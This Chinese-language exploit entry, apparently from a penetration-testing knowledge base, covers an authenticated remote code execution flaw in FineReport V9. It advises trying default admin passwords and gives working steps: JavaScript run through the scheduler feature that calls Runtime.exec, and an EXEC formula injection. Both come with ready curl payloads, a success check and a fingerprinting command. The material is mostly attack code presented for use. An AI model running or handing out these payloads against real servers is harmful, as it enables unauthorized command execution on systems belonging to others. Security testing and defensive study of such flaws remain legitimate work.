---
id: FINEREPORT-RCE
title: 帆软FineReport V9 后台远程代码执行
product: finereport
vendor: 帆软软件
version_affected: "v9.0"
severity: CRITICAL
tags: [rce, 需要认证, 国产]
fingerprint: ["FineReport", "帆软", "/WebReport/", "ReportServer"]
---

## 漏洞描述

FineReport V9 后台存在远程代码执行漏洞，通过「定时调度」功能可执行系统命令。

## 影响版本

- FineReport v9.0

## 前置条件

- 目标运行帆软 FineReport V9 且可通过网络访问
- 需要后台管理员账号（可尝试默认凭据 `admin`/`admin` 或 `admin`/`123456`）

## 利用步骤

### Step 1: 登录后台

默认凭据: `admin` / `admin` 或 `admin` / `123456`

### Step 2: 利用定时调度执行命令

后台 → 管理系统 → 定时调度 → 新建调度 → 选择「执行 JavaScript」:

```javascript
var a = java.lang.Runtime.getRuntime();
var b = a.exec("whoami");
var c = new java.io.BufferedReader(new java.io.InputStreamReader(b.getInputStream()));
var d = "";var e = "";
while((d = c.readLine()) != null){e = e + d + "\n";}
e;
```

### Step 3: 另一种方式 - 公式执行

```http
POST /WebReport/ReportServer?op=fr_dialog&cmd=parameters_d&reportlet=1.cpt HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

__parameters__=[{"name":"test","value":"=EXEC(\"whoami\")"}]
```

## Payload

### 公式注入执行命令

```bash
curl -X POST "http://target/WebReport/ReportServer?op=fr_dialog&cmd=parameters_d&reportlet=1.cpt" \
  -b "JSESSIONID=<admin_session>; fr_password=<token>" \
  -d '__parameters__=[{"name":"test","value":"=EXEC(\"id\")"}]'
```

### 定时调度 JavaScript RCE

```bash
curl -X POST "http://target/WebReport/ReportServer?op=fr_schedule&cmd=add_schedule" \
  -b "JSESSIONID=<admin_session>; fr_password=<token>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'schedule_name=test&exec_type=js&js_content=var+a=java.lang.Runtime.getRuntime();var+b=a.exec("id");var+c=new+java.io.BufferedReader(new+java.io.InputStreamReader(b.getInputStream()));var+d="";var+e="";while((d=c.readLine())!=null){e=e%2Bd%2B"\n";}e;'
```

## 验证方法

- 公式注入：响应中包含命令执行结果（如 `uid=0(root)`）即确认 RCE
- 定时调度：执行后查看调度结果输出，包含命令结果即确认

## 指纹确认

```bash
curl -s http://target/WebReport/ReportServer?op=fr_server&cmd=sc_version
```
